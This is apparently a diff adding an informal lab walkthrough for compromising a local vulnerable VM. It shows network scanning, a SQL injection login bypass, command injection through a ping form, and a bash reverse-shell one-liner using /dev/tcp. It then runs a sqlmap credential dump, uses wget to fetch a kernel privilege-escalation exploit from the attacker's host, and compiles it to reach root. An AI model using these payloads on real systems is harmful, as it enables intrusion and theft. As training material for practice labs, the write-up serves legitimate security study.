@@ -1,0 +1,86 @@
+firstly discover our machine
+
+$ sudo netdiscover -i vboxnet0
+
+it is on 192.168.56.102
+
+$ sudo nmap -sS -vv 192.168.56.102
+
+We have Apache Server 2.0.52
+We have CUPS service 1.1
+3306 Unauthorized Mysql Service
+Let's check the website
+i assume basic sqli will success this remote
+system administration login page.
+I tried 1'or'1'='1 and it success.
+and there is ping command i suppose.
+The key point is command injection. I am sure.
+Yes there is.
+try google.com;ls
+bind a bash to any port and we are in.
+
+
+bash -i >& /dev/tcp/192.168.56.102/1881 0>&1
+
+
+first i would like to use sqlmap here.
+
+$sqlmap -u "http://192.168.56.102/index.php" --dbms=MySQL --dump --data "uname=admin&psw=password" --level=5 --risk=3
+
+Database: webapp
+Table: users
+[2 entries]
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+| 1  | admin    | 5afac8d85f |
+| 2  | john     | 66lajGGbla |
++----+----------+------------+
+
+i tried these credentials with SSH but not suprisingly does not worked.
+
+mysql_connect("localhost", "john", "hiroshima")
+this is mysql credentials i suppose.
+and we have to find privilege escalation exploit.
+$ searchsploit centos 4.5
+I found 9542.c and 9479.c
+9542 not worked at all idk why.
+9479 worked like a charm.
+
+
+bash-3.00$ wget 192.168.56.1:8000/9479.c
+--07:44:20--  http://192.168.56.1:8000/9479.c
+           => `9479.c.1'
+Connecting to 192.168.56.1:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3,507 (3.4K) [text/plain]
+
+    0K ...                                                   100%  238.90 MB/s
+
+07:44:20 (238.90 MB/s) - `9479.c.1' saved [3507/3507]
+
+bash-3.00$ ls
+9479.c
+9479.c.1
+priv
+bash-3.00$ rm 9479.c.1
+bash-3.00$ rm priv
+bash-3.00$ ls
+9479.c
+bash-3.00$ gcc -o priv 9479.c
+9479.c:130:28: warning: no newline at end of file
+bash-3.00$ ls
+9479.c
+priv
+bash-3.00$ chmod +x priv
+bash-3.00$ ./priv
+sh: no job control in this shell
+sh-3.00# ls
+9479.c
+priv
+sh-3.00# whoami
+root
+sh-3.00# 
+
+done!
+
